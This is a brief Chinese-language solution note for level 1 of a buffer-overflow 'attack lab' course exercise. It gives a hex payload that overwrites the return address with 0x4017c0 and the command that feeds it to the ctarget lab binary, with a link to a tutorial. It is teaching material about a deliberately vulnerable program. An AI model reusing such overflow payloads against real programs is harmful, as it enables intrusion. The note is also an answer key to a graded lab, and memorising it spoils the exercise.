# attack lab using buffer overflow

## 第一关
新建 sol.txt
输入
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```

然后发动攻击！
```
./hex2raw < sol1.txt | ./ctarget -q
```

知乎教程链接：https://zhuanlan.zhihu.com/p/408669380

谢谢阅读！
